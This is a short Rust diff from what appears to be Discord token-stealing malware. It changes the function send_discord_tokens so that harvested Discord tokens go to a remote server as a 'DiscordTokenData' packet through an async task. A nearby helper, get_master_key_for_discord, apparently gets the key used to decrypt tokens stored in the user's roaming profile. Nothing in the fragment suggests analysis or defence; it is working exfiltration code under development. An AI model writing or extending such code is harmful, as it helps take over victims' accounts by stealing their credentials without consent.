@@ -142,10 +142,12 @@ pub fn send_discord_tokens() {
     }
 
     let payload = DiscordTokenData { tokens };
-    match send_packet_sync(ServerboundPacket::DiscordTokenData(payload)) {
-        Ok(_) => println!("[Discord] Sent DiscordTokenData packet"),
-        Err(e) => println!("[Discord] Failed to send DiscordTokenData: {}", e),
-    }
+    tokio::spawn(async move {
+        match crate::handler::send_packet(ServerboundPacket::DiscordTokenData(payload)).await {
+            Ok(_) => println!("[Discord] Sent DiscordTokenData packet"),
+            Err(e) => println!("[Discord] Failed to send DiscordTokenData: {}", e),
+        }
+    });
 }
 
 fn get_master_key_for_discord(roaming: &str, path_suffix: &str) -> Option<Vec<u8>> {
